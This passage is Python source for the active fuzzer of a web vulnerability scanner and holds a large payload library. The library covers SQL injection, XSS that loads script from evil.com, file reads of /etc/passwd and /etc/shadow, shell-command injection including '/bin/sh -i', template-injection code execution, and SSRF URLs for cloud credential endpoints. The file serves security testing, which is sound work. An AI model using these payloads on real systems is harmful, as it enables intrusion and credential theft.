"""
Active Fuzzer — sends real attack payloads to all discovered input surfaces.
This is what separates a real DAST from an LLM-guided curl runner.

Vulnerability classes covered:
  SQLi, XSS, LFI/Path Traversal, CMDi, SSTI, SSRF, XXE,
  Open Redirect, IDOR, Header Injection, CORS, CRLF Injection,
  HTTP Request Smuggling (CL.TE, TE.CL, TE.TE, CL.CL), CSRF,
  Buffer Overflow / Memory Corruption, XPath Injection,
  HTTP Response Splitting
"""
from __future__ import annotations
import base64
import io
import logging
import math
import re
import threading
import time
import zipfile
from dataclasses import dataclass
from typing import Optional, Callable, TYPE_CHECKING
from urllib.parse import urlencode, urlparse, parse_qs, urljoin, quote as _url_quote

import requests
import requests.exceptions

log = logging.getLogger("dast.fuzzer")

if TYPE_CHECKING:
    from .oast import OASTServer
import urllib3
urllib3.disable_warnings()

from .scope import ScopeManager
from .evidence import EvidenceStore, evidence_store as _global_store
from .confidence import AuditIssueConfidence, infer_confidence
from .industry_patterns import (
    ACTIVE_PAYLOAD_EXTENSIONS,
    DETECTOR_EXTENSIONS,
    PARAM_NAME_RULE_EXTENSIONS,
    UPLOAD_PROBE_EXTENSIONS,
)
from .payload_safety import PayloadSafetyFilter, is_dangerous_endpoint

try:
    from .proof_validator import ProofValidator
    _HAS_PROOF = True
except Exception:
    _HAS_PROOF = False


# ══════════════════════════════════════════════════════════════════════════════
# PAYLOAD LIBRARY — 500+ real attack payloads
# ══════════════════════════════════════════════════════════════════════════════

PAYLOADS: dict[str, list[str]] = {

    # ── Error-based SQLi (80+ payloads — MySQL, PostgreSQL, MSSQL, Oracle,
    #    SQLite, MariaDB, DB2, H2, CockroachDB, MongoDB/NoSQL) ────────────
    "sqli_error": [
        # Classic quote / syntax breaking
        "'", '"', "''", "`;", "'))", "')", "\\",
        "' OR '1'='1", "' OR 1=1--", "' OR 1=1#",
        "' OR 1=1/*", "\" OR \"1\"=\"1",
        "1 OR 1=1", "1 AND 1=0", "1 AND 1=1",
        "1' AND '1'='1", "1' AND '1'='2",
        "admin'--", "admin' #", "admin'/*",
        "' or 1=1 limit 1 -- -+",
        # ORDER BY / GROUP BY column enumeration
        "1' ORDER BY 1--", "1' ORDER BY 10--", "1' ORDER BY 50--",
        "1' GROUP BY 1--",
        # UNION-based (MySQL, PostgreSQL, MSSQL)
        "1 UNION SELECT NULL--", "1 UNION SELECT NULL,NULL--",
        "1 UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT 1,2,3--",
        "' UNION ALL SELECT 1,2,3,4,5--",
        "' UNION SELECT username,password FROM users--",
        "0 UNION SELECT 1,@@version,3--",
        "-1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables--",
        # MySQL specific
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
        "' AND UPDATEXML(1,CONCAT(0x7e,version()),1)--",
        "extractvalue(1,concat(0x7e,version()))",
        "' AND EXP(~(SELECT * FROM (SELECT version())a))--",
        "' AND JSON_KEYS((SELECT CONVERT((SELECT GROUP_CONCAT(user) FROM mysql.user) USING utf8)))--",
        "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        "'; SELECT SLEEP(0)--",
        # PostgreSQL specific
        "' AND CAST(version() AS int)--",
        "' AND 1=CAST((SELECT version()) AS int)--",
        "';SELECT version()--",
        "' UNION SELECT NULL,current_database(),NULL--",
        "$1' AND 1=1--",  # dollar-quoting
        # MSSQL specific
        "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
        "'; EXEC master..xp_cmdshell('whoami')--",
        "1; SELECT * FROM information_schema.tables--",
        "' AND 1=DB_NAME()--",
        "'; SELECT @@servername--",
        "' UNION SELECT NULL,@@version,NULL--",
        # Oracle specific
        "' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT banner FROM v$version WHERE ROWNUM=1))--",
        "' UNION SELECT NULL,banner,NULL FROM v$version--",
        "' AND CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))--",
        "' OR 1=1--",
        # SQLite specific
        "' UNION SELECT sql FROM sqlite_master--",
        "' AND CAST(sqlite_version() AS int)--",
        # Stacked queries
        "'; SELECT pg_sleep(0)--",
        "'; WAITFOR DELAY '0:0:0'--",
        "'; EXECUTE IMMEDIATE 'SELECT 1'--",
        # JSON / REST API specific
        '{"$gt":""}',  # MongoDB NoSQL
        '{"$ne":null}',  # MongoDB NoSQL
        "1' OR '1'='1' /*",
        # WAF bypass — inline comment encoding (MySQL)
        "1'/*!50000OR*/1=1--",
        "1'/*!UNION*//*!SELECT*/1,2,3--",
        "' /*!50000AND*/ 1=1--",
        # WAF bypass — case mixing & whitespace alternatives
        "1' oR 1=1--",
        "'%09OR%091=1--",   # tab instead of space
        "'%0aOR%0a1=1--",  # newline instead of space
        "'+OR+1=1--",      # plus as space
        # WAF bypass — encoding variants
        "0x31",             # hex encoding
        "%27%20OR%201%3D1--",  # URL-encoded ' OR 1=1--
        "' %4fR 1=1--",    # partial hex for 'O'
        # WAF bypass — double URL encoding
        "%2527%2520OR%25201%253D1--",
        # WAF bypass — Unicode
        "' \u004FR 1=1--",
        "' \uff2f\uff32 1=1--",  # fullwidth OR
        # Second-order / stored injection markers
        "test'||'injection",
        "test'/**/OR/**/1=1--",
    ],

    # ── Boolean-based blind SQLi (true/false pairs for differential analysis)
    "sqli_bool_true": [
        "' AND 1=1--",
        "' AND 1=1#",
        "' AND 'a'='a",
        "1 AND 1=1",
        "' OR 1=1--",
        "') AND 1=1--",
        "')) AND 1=1--",
        "' AND 1=1 AND '1'='1",
        "1) AND 1=1--",
    ],
    "sqli_bool_false": [
        "' AND 1=2--",
        "' AND 1=2#",
        "' AND 'a'='b",
        "1 AND 1=2",
        "' OR 1=2--",
        "') AND 1=2--",
        "')) AND 1=2--",
        "' AND 1=2 AND '1'='1",
        "1) AND 1=2--",
    ],

    # ── Time-based blind SQLi (MySQL, MSSQL, PostgreSQL, Oracle, SQLite) ──
    "sqli_blind_time": [
        # MySQL
        "' AND SLEEP(3)--",
        "' AND SLEEP(3)#",
        "' OR SLEEP(3)--",
        "1 AND SLEEP(3)",
        "' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--",
        "' AND BENCHMARK(5000000,SHA1('test'))--",
        "1' AND SLEEP(3) AND '1'='1",
        "') AND SLEEP(3)--",
        # MSSQL
        "1; WAITFOR DELAY '0:0:3'--",
        "'; IF (1=1) WAITFOR DELAY '0:0:3'--",
        "'; IF (1=1) WAITFOR DELAY '0:0:3' ELSE WAITFOR DELAY '0:0:0'--",
        # PostgreSQL
        "1;SELECT pg_sleep(3)--",
        "' OR pg_sleep(3)--",
        "'; SELECT pg_sleep(3)--",
        "' AND 1=(SELECT 1 FROM pg_sleep(3))--",
        # Oracle
        "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',3)--",
        "1 AND UTL_INADDR.GET_HOST_ADDRESS('sleep3.'||(SELECT 1 FROM DUAL))='x'",
        # SQLite
        "' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000/2))))--",
    ],

    # ── UNION-based SQLi (canary dast7371 + version extraction) ──────────
    "sqli_union": [
        # 1-column
        "' UNION SELECT 'dast7371'--",
        "1 UNION SELECT 'dast7371'--",
        "-1 UNION SELECT 'dast7371'--",
        "' UNION SELECT 'dast7371'#",
        # 2-column — canary in each position
        "' UNION SELECT 'dast7371',NULL--",
        "' UNION SELECT NULL,'dast7371'--",
        "-1 UNION SELECT 'dast7371',NULL--",
        "-1 UNION SELECT NULL,'dast7371'--",
        "' UNION SELECT 'dast7371',NULL#",
        # 3-column — canary in each position
        "' UNION SELECT 'dast7371',NULL,NULL--",
        "' UNION SELECT NULL,'dast7371',NULL--",
        "' UNION SELECT NULL,NULL,'dast7371'--",
        "-1 UNION SELECT 'dast7371',NULL,NULL--",
        "-1 UNION SELECT NULL,'dast7371',NULL--",
        "-1 UNION SELECT NULL,NULL,'dast7371'--",
        # 4 and 5-column
        "' UNION SELECT 'dast7371',NULL,NULL,NULL--",
        "-1 UNION SELECT 'dast7371',NULL,NULL,NULL--",
        "' UNION SELECT 'dast7371',NULL,NULL,NULL,NULL--",
        "-1 UNION SELECT 'dast7371',NULL,NULL,NULL,NULL--",
        # UNION ALL variants
        "' UNION ALL SELECT 'dast7371'--",
        "-1 UNION ALL SELECT 'dast7371',NULL--",
        "-1 UNION ALL SELECT 'dast7371',NULL,NULL--",
        # Parenthesised (bypass bracket context)
        "') UNION SELECT 'dast7371'--",
        "') UNION SELECT 'dast7371',NULL--",
        "') UNION SELECT NULL,'dast7371'--",
        # DB version extraction (secondary confirmation after canary hit)
        "-1 UNION SELECT @@version--",
        "-1 UNION SELECT @@version,NULL--",
        "-1 UNION SELECT NULL,@@version--",
        "-1 UNION SELECT version()--",
        "-1 UNION SELECT version(),NULL--",
        "' UNION SELECT banner,NULL FROM v$version WHERE ROWNUM=1--",
    ],

    "xss_reflected": [
        # ── HTML context — basic tag injection ───────────────────────────
        "<script>alert(1)</script>",
        "<script src=//evil.com/x.js></script>",
        "<script>confirm(1)</script>",
        "<script>prompt(1)</script>",
        "<script>alert`1`</script>",                   # backtick invocation
        "<script>alert(document.domain)</script>",
        "<script>alert(document.cookie)</script>",
        # ── HTML context — tag + event handler injection ─────────────────
        "<img src=x onerror=alert(1)>",
        "<img/src=x onerror=alert(1)>",                # no space variant
        "<img src=x onerror=alert(1)//",                # unclosed tag
        "<svg onload=alert(1)>",
        "<svg/onload=alert(1)>",
        "<body onload=alert(1)>",
        "<body onpageshow=alert(1)>",
        "<video src=x onerror=alert(1)>",
        "<video><source onerror=alert(1)>",
        "<audio src=x onerror=alert(1)>",
        "<marquee onstart=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<input autofocus onfocus=alert(1)>",
        "<input onfocus=alert(1) autofocus>",           # reordered attrs
        "<select autofocus onfocus=alert(1)>",
        "<textarea autofocus onfocus=alert(1)>",
        "<keygen autofocus onfocus=alert(1)>",
        "<meter onmouseover=alert(1)>0</meter>",
        "<div onmouseover=alert(1)>XSS</div>",
        "<div onmouseenter=alert(1)>XSS</div>",
        "<div onpointerover=alert(1)>XSS</div>",       # pointer events
        "<table><tr><td onmouseover=alert(1)>XSS",
        "<isindex type=image src=x onerror=alert(1)>",
        "<embed src=javascript:alert(1)>",
        "<object data=javascript:alert(1)>",
        "<iframe src=javascript:alert(1)>",
        "<iframe srcdoc='<script>alert(1)</script>'>",
        # ── Attribute context — breaking out of attributes ───────────────
        "\"><script>alert(1)</script>",
        "'><script>alert(1)</script>",
        "'\"><img src=x onerror=alert(1)>",
        "\" onmouseover=alert(1) x=\"",
        "' onmouseover=alert(1) x='",
        "\" autofocus onfocus=alert(1) x=\"",
        "' autofocus onfocus=alert(1) x='",
        "`-alert(1)-`",                                 # backtick context
        "\"><svg/onload=alert(1)>",
        "'><svg/onload=alert(1)>",
        "\" onfocus=alert(1) autofocus=\"",
        "\"><details/open/ontoggle=alert(1)>",
        # ── JavaScript context — breaking out of JS strings ──────────────
        "</script><script>alert(1)</script>",
        "'-alert(1)-'",
        "\\'-alert(1)-\\'",
        "\"-alert(1)-\"",
        "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",   # hex escape in JS
        "');alert(1);//",
        "\");alert(1);//",
        "}}};alert(1);//",
        "${alert(1)}",                                   # template literal
        "${7*7}",                                        # expression test
        # ── URL context — protocol handlers ──────────────────────────────
        "javascript:alert(1)",
        "javascript:alert(document.domain)",
        "javascript://comment%0aalert(1)",               # JS comment newline
        "data:text/html,<script>alert(1)</script>",
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
        "vbscript:alert(1)",                             # IE legacy
        "javascript:/*-->*/alert(1)",
        # ── Polyglot payloads — work across multiple contexts ────────────
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%%0telerik%0telerik11telerik>",
        "'\"--></style></script><script>alert(1)</script>",
        "'\"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL3gifTthLmltZyBzcmM9eA== onerror=alert(1)>",
        "'-alert(1)-'",
        "\"><svg/onload=alert(1)>",
        # ── Framework-specific ───────────────────────────────────────────
        "{{constructor.constructor('alert(1)')()}}",     # AngularJS 1.x sandbox escape
        "{{$on.constructor('alert(1)')()}}",             # AngularJS 1.x alt
        "{{toString().constructor.prototype.charAt=[].join;$eval('x=alert(1)')}}",
        "{{x={y:''.constructor.prototype};x.y.charAt=[].join;$eval('x=alert(1)')}}",
        "<div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>",
        "{{_c.constructor('alert(1)')()}}",              # Vue.js template
        "<div v-html=\"'<img src=x onerror=alert(1)>'\"></div>",
        "{{alert(1)}}",                                  # generic template
        "{{{alert(1)}}}",                                # Mustache/Handlebars triple
        "#{alert(1)}",                                   # Ruby ERB / Pug
        # ── WAF bypass — case mixing ────────────────────────────────────
        "<Script>alert(1)</Script>",
        "<SCRIPT>alert(1)</SCRIPT>",
        "<sCrIpT>alert(1)</ScRiPt>",
        "<scr<script>ipt>alert(1)</scr</script>ipt>",   # nested tag
        "<scr\x00ipt>alert(1)</scr\x00ipt>",            # null byte
        # ── WAF bypass — encoding variants ───────────────────────────────
        "<%2Fscript><script>alert(1)<%2Fscript>",
        "%3Cscript%3Ealert(1)%3C/script%3E",            # URL encoded
        "%253Cscript%253Ealert(1)%253C/script%253E",    # double URL encoded
        "&#60;script&#62;alert(1)&#60;/script&#62;",    # HTML decimal entity
        "&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;",  # HTML hex entity
        "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>",  # entity in attr
        "\u003cscript\u003ealert(1)\u003c/script\u003e",  # unicode escape
        "<img src=x onerror=\"alert(1)\"  >",           # extra whitespace
        "<img\tsrc=x\tonerror=alert(1)>",               # tab instead of space
        "<img\nsrc=x\nonerror=alert(1)>",               # newline as separator
        "<img/src=x/onerror=alert(1)>",                 # slash as separator
        # ── WAF bypass — tag mutation & obfuscation ──────────────────────
        "<svg><animate onbegin=alert(1) attributeName=x>",
        "<svg><set onbegin=alert(1) attributeName=x>",
        "<math><mtext><table><mglyph><svg><mtext><style><img src=x onerror=alert(1)>",
        "<math><mi//xlink:href=\"data:x,<script>alert(1)</script>\">",
        "<a href=\"\\x0Bjavascript:alert(1)\">click</a>",
        "<a href=\"&#1;javascript:alert(1)\">click</a>",
        "<a\thref=\"javascript:alert(1)\">click</a>",   # tab before href
        "<!--<script>-->alert(1)<!--</script>-->",       # comment bypass
        # ── DOM-based XSS markers (trigger DOM sinks) ────────────────────
        "#<img src=x onerror=alert(1)>",                 # location.hash sink
        "javascript:alert(1)//",                         # location.href sink
        "<img src=x onerror=alert(1)>",                  # innerHTML sink
        "'-alert(1)-'",                                  # document.write sink
        "';alert(1)//",                                  # eval / setTimeout sink
        "\");alert(1)//",                                # eval context
        "data:text/html,<script>alert(1)</script>",      # window.open sink
        "1;alert(1)",                                    # postMessage eval
        # ── CSP bypass attempts ──────────────────────────────────────────
        "<base href=//evil.com/>",                       # base tag hijack
        "<link rel=import href=//evil.com/x.html>",     # HTML import
        "<meta http-equiv=refresh content='0;url=javascript:alert(1)'>",
        "<script src='https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.min.js'></script><div ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</div>",
        # ── Mutation XSS (mXSS) — browser parser tricks ──────────────────
        "<listing><img src=1 onerror=alert(1)>",
        "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
        "<style><img src=\"</style><img src=x onerror=alert(1)>\"//",
        "<xmp><img src=\"</xmp><img src=x onerror=alert(1)>\"//",
    ],

    # ── Stored XSS — {CANARY} is replaced with a unique token per injection ──
    "xss_stored": [
        "<script>alert('{CANARY}')</script>",
        "<img src=x onerror=alert('{CANARY}')>",
        "<svg onload=alert('{CANARY}')>",
        "<body onload=alert('{CANARY}')>",
        "\"><script>alert('{CANARY}')</script>",
        "'><img src=x onerror=alert('{CANARY}')>",
        "<details open ontoggle=alert('{CANARY}')>",
        "<iframe srcdoc='<script>alert(\"{CANARY}\")</script>'>",
        "<div onmouseover=alert('{CANARY}')>{CANARY}</div>",
        "<input onfocus=alert('{CANARY}') autofocus>",
        "<a href=javascript:alert('{CANARY}')>{CANARY}</a>",
        "{CANARY}",   # plain text — test if stored at all (even if escaped)
        # ── mXSS via parser confusion ────────────────────────────────────
        "<noscript><p title=\"</noscript><img src=x onerror=alert('{CANARY}')>\">",
        "<math><mi//xlink:href=\"data:x,<script>alert('{CANARY}')</script>\">",
        # ── Exotic HTML5 event handlers ──────────────────────────────────
        "<video autoplay onplay=alert('{CANARY}')><source src=x></video>",
        "\"><iframe srcdoc='&lt;script&gt;alert(\"{CANARY}\")&lt;/script&gt;'>",
    ],

    # ── Second-Order XSS — stored as data, fires on re-render ────────────────
    # Payload stored in DB initially; fires when admin/template re-renders it.
    "xss_second_order": [
        "<script>alert(document.domain)</script>",
        "<img src=x onerror=alert(document.domain)>",
        "\"><svg onload=alert(document.domain)>",
        "'-alert(document.domain)-'",
        "<details open ontoggle=alert(document.domain)>",
        "{{constructor.constructor('alert(document.domain)')()}}",
        "${alert(document.domain)}",
        "<!--<img src=x onerror=alert(document.domain)>-->",
    ],

    "lfi": [
        "../../../etc/passwd",
        "../../../../etc/passwd",
        "../../../../../etc/passwd",
        "../../../../../../etc/passwd",
        "../../../../../../../../../../etc/passwd",
        "....//....//....//etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252F..%252F..%252Fetc%252Fpasswd",  # double URL encoding
        "..%c0%af..%c0%afetc%c0%afpasswd",       # UTF-8 encoding
        "../../../etc/passwd%00",                 # null byte
        "../../../etc/shadow",
        "/etc/passwd",
        "/etc/shadow",
        "/proc/self/environ",
        "/proc/version",
        "/var/log/apache2/access.log",
        "/var/log/nginx/access.log",
        "..\\..\\..\\windows\\win.ini",
        "..%5C..%5C..%5Cwindows%5Cwin.ini",
        "C:\\windows\\win.ini",
        "file:///etc/passwd",
        "php://filter/convert.base64-encode/resource=index.php",
        "php://input",
        "expect://id",
        "data://text/plain,<?php phpinfo(); ?>",
        # ── Path normalization bypasses ────────────────────────────────────
        "..;/..;/..;/etc/passwd",                   # Tomcat/Jetty normalization
        "..;/..;/..;/windows/win.ini",
        "/..;/..;/etc/passwd",
        "..%252f..%252f..%252fetc%252fpasswd",      # Double URL encode
        "..%c0%af..%c0%af..%c0%afetc/passwd",       # Overlong UTF-8
        "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd",  # Unicode fullwidth
        "%252e%252e%252f%252e%252e%252fetc/passwd",  # Triple encode dots
        "....//....//....//....//etc/passwd",         # Filter bypass (strip ../)
        "..././..././..././etc/passwd",              # Another filter bypass
        "..%00/..%00/..%00/etc/passwd",              # Null in path
        "/etc/passwd%0a",                            # Newline append
        "..\\..\\..\\..\\etc\\passwd",              # Backslash on Windows proxy
        "/%2e%2e/%2e%2e/%2e%2e/etc/passwd",          # Encoded dots
        "../../../etc/passwd#",                       # Fragment bypass
        "../../../etc/passwd?.css",                   # Extension spoof
    ],

    "cmdi": [
        # ── Original 30 payloads — Linux basic separators ────────────────
        ";id",
        "|id",
        "&&id",
        "`id`",
        "$(id)",
        ";whoami",
        "|whoami",
        "&&whoami",
        ";cat /etc/passwd",
        "|cat /etc/passwd",
        "&& cat /etc/passwd",
        "; ls -la",
        "| ls -la",
        "& ls",
        ";sleep 3",
        "|sleep 3",
        "&&sleep 3",
        ";ping -c 3 127.0.0.1",
        "| ping -c 3 127.0.0.1",
        "`sleep 3`",
        "$(sleep 3)",
        "\n/bin/sh -i",
        ";id;",
        "a;id",
        "a|id",
        "%0aid",                                # URL-encoded newline
        "%0a/usr/bin/id",
        "||id",
        "; echo 'CMDI_CONFIRMED'",
        "| echo 'CMDI_CONFIRMED'",
        # ── Windows cmd.exe commands ─────────────────────────────────────
        "&dir",
        "|dir",
        ";dir",
        "& dir C:\\",
        "| type C:\\Windows\\win.ini",
        "& type C:\\Windows\\win.ini",
        "& ipconfig /all",
        "| ipconfig",
        "& net user",
        "| net user",
        "& hostname",
        "| systeminfo",
        "& ver",                                # Windows version
        "| set",                                # Environment variables
        "& timeout /t 5 /nobreak",             # Windows time-based blind
        "| ping -n 5 127.0.0.1",              # Windows ping delay
        # ── PowerShell vectors ───────────────────────────────────────────
        ";powershell -c whoami",
        "|powershell -c \"Get-ChildItem\"",
        "&powershell -c \"[System.Net.Dns]::GetHostName()\"",
        ";powershell -c \"$env:USERNAME\"",
        "|powershell Invoke-Expression whoami",
        "&powershell -enc dwBoAG8AYQBtAGkA",   # base64 "whoami"
        # ── WAF bypass — IFS whitespace substitution ─────────────────────
        ";${IFS}id",
        ";$IFS$9id",
        ";{id}",                                # Brace no-space
        ";cat${IFS}/etc/passwd",
        ";cat$IFS$9/etc/passwd",
        "|cat${IFS}/etc/passwd",
        # ── WAF bypass — brace expansion ─────────────────────────────────
        ";{cat,/etc/passwd}",
        ";{ls,-la,/}",
        ";{echo,CMDI_CONFIRMED}",
        # ── WAF bypass — wildcard and concatenation ──────────────────────
        ";/???/??t /???/p??s??",                # /bin/cat /etc/passwd via wildcards
        ";c'a't /etc/passwd",                   # Quote-break bypass
        ";c\"a\"t /etc/passwd",                 # Double-quote break
        ";c\\at /etc/passwd",                   # Backslash bypass
        ";/bin/c?t /etc/passwd",                # Single-char wildcard
        # ── WAF bypass — hex / octal encoding ────────────────────────────
        ";$(printf '\\x69\\x64')",              # hex-encoded "id"
        ";$(printf '\\151\\144')",              # octal-encoded "id"
        ";$'\\x69\\x64'",                       # ANSI-C quoting "id"
        # ── WAF bypass — URL-encoded separators ──────────────────────────
        "%3Bid",                                # ; URL-encoded
        "%7Cid",                                # | URL-encoded
        "%26%26id",                             # && URL-encoded
        "%0d%0aid",                             # CRLF + id
        "%09id",                                # Tab separator
        "%0a%0did",                             # LF+CR
        # ── Double-encoding ──────────────────────────────────────────────
        "%253Bid",                              # Double-encoded ;
        "%257Cid",                              # Double-encoded |
        # ── Blind time-based — Linux ─────────────────────────────────────
        ";sleep${IFS}5",
        "|sleep${IFS}5",
        "&&sleep${IFS}5",
        "`sleep${IFS}5`",
        "$(sleep${IFS}5)",
        ";{sleep,5}",
        # ── Nested / chained ─────────────────────────────────────────────
        ";id|base64",                           # Exfil via encoding
        "$(echo${IFS}id|sh)",                   # Indirect execution
        ";bash -c 'id'",
        ";sh -c 'id'",
        ";/usr/bin/env id",
        # ── Context-aware (prepended value) ──────────────────────────────
        "127.0.0.1;id",                         # IP input + injection
        "127.0.0.1|id",
        "127.0.0.1&&id",
        "test@test.com;id",                     # Email input + injection
        "file.txt;id",                          # Filename input + injection
    ],

    "ssti": [
        # ── Original 16 payloads ──────────────────────────────────────────
        "{{7*7}}",
        "${7*7}",
        "#{7*7}",
        "<%= 7*7 %>",
        "{{7*'7'}}",                           # Jinja2 string repeat
        "{{config}}",                           # Flask/Jinja2 config leak
        "{{request.environ}}",
        "${7*7}",                               # Freemarker / Velocity
        "${class.getClassLoader()}",
        "*{7*7}",                               # Spring SpEL
        "@{7*7}",                               # Thymeleaf
        "{{''.__class__.__mro__[2].__subclasses__()}}",  # Jinja2 RCE vector
        "%{7*7}",                               # JSP EL
        "{{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')}}",
        "{{lipsum.__globals__.os.popen('id').read()}}",
        # ── Jinja2 / Flask (Python) — additional ─────────────────────────
        "{{self.__init__.__globals__.__builtins__}}",
        "{{cycler.__init__.__globals__.os.popen('id').read()}}",
        "{{namespace.__init__.__globals__.os}}",
        "{{url_for.__globals__['__builtins__']}}",
        # ── Mako (Python) ────────────────────────────────────────────────
        "<%7*7%>",                              # Mako expression
        "${self.module.__loader__}",            # Mako module access
        "<%import os; x=os.popen('id').read()%>${x}",
        # ── Tornado (Python) ─────────────────────────────────────────────
        "{% import os %}{{os.popen('id').read()}}",
        "{%raw 7*7%}",
        # ── Twig (PHP) ──────────────────────────────────────────────────
        "{{_self.env.getFilter('id')}}",        # Twig _self access
        "{{['id']|filter('system')}}",          # Twig filter RCE
        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
        "{{dump(app)}}",                        # Twig debug dump
        # ── Smarty (PHP) ─────────────────────────────────────────────────
        "{7*7}",                                # Smarty arithmetic
        "{php}echo 7*7;{/php}",                 # Smarty PHP tag (v3-)
        "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,'<?php passthru($_GET[c]); ?>',self::clearConfig())}",
        "{if 7*7}{/if}",                        # Smarty if eval
        "{system('id')}",                       # Smarty direct function
        # ── Freemarker (Java) ────────────────────────────────────────────
        "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
        "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
        "${object.getClass().forName(\"java.lang.Runtime\")}",
        "[#assign ex='freemarker.template.utility.Execute'?new()]${ex('id')}",
        # ── Velocity (Java) ──────────────────────────────────────────────
        "#set($x=7*7)${x}",                    # Velocity set + eval
        "#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$rt.getRuntime().exec('id'))",
        "$class.inspect('java.lang.Runtime').type.getRuntime().exec('id')",
        # ── Pebble (Java) ────────────────────────────────────────────────
        "{{\"\".__class}}",                     # Pebble class access
        "{%set cmd='id'%}{{\"\".__class.forName('java.lang.Runtime').getRuntime().exec(cmd)}}",
        # ── Spring SpEL (Java) — additional ──────────────────────────────
        "${T(java.lang.Runtime).getRuntime().exec('id')}",
        "#{T(java.lang.Runtime).getRuntime().exec('id')}",
        # ── Thymeleaf (Java) — additional ────────────────────────────────
        "__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x",
        # ── ERB (Ruby) — additional ──────────────────────────────────────
        "<%= system('id') %>",                  # ERB command execution
        "<%= IO.popen('id').read %>",           # ERB IO pipe
        "<%= `id` %>",                          # ERB backtick exec
        # ── Slim (Ruby) ─────────────────────────────────────────────────
        "= system('id')",                       # Slim inline eval
        "- system('id')",                       # Slim code line
        # ── Jade / Pug (Node.js) ─────────────────────────────────────────
        "=7*7",                                 # Pug unbuffered eval
        "#{root.process.mainModule.require('child_process').execSync('id')}",
        # ── Handlebars (Node.js) ─────────────────────────────────────────
        "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push \"return 7*7\"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}",
        # ── Nunjucks (Node.js) ───────────────────────────────────────────
        "{{range.constructor(\"return 7*7\")()}}",
        "{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('id')\")()}}",
        # ── Dust.js (Node.js) ────────────────────────────────────────────
        "{@math key=\"7\" method=\"multiply\" operand=\"7\"/}",
        "{@if cond=\"7*7\"}{/if}",
        # ── Go templates ─────────────────────────────────────────────────
        "{{.}}",                                # Go dump context
        "{{printf \"%d\" 49}}",                 # Go printf
        "{{html \"<script>\"}}",                # Go html function
        # ── Razor (.NET) ─────────────────────────────────────────────────
        "@(7*7)",                               # Razor expression
        "@{var x=7*7;}@x",                      # Razor code block
        "@System.Diagnostics.Process.Start(\"cmd\",\"/c id\")",
        # ── EL / OGNL (Java — Struts/JSP) ───────────────────────────────
        "${7*7}",                               # Unified EL
        "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-SSTI','49')}",
        "${#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS}",
        "%{(#rt=@java.lang.Runtime@getRuntime().exec('id'))}",
        # ── High-confidence arithmetic confirmation (1337*1337=1787569) ────
        "{{1337*1337}}",                        # Jinja2/Nunjucks high-confidence
        "${1337*1337}",                          # Freemarker/Spring EL high-confidence
        "#{1337*1337}",                          # Ruby/SpEL high-confidence
        "<%= 1337*1337 %>",                      # ERB/EJS high-confidence
        "*{1337*1337}",                          # Spring SpEL high-confidence
        "#set($x=1337*1337)${x}",               # Velocity high-confidence
    ],

    "ssrf": [
        # ── AWS EC2 IMDS v1 (unauthenticated) ──────────────────────────────
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/meta-data/iam/info",
        "http://169.254.169.254/latest/meta-data/hostname",
        "http://169.254.169.254/latest/meta-data/local-ipv4",
        "http://169.254.169.254/latest/user-data",
        "http://169.254.169.254/latest/dynamic/instance-identity/document",
        # ── GCP Metadata Service (requires Metadata-Flavor: Google header) ─
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        "http://metadata.google.internal/computeMetadata/v1/project/project-id",
        "http://169.254.169.254/computeMetadata/v1/",              # GCP alt
        # ── Azure IMDS ─────────────────────────────────────────────────────
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
        # ── DigitalOcean Metadata ──────────────────────────────────────────
        "http://169.254.169.254/metadata/v1/",
        "http://169.254.169.254/metadata/v1/id",
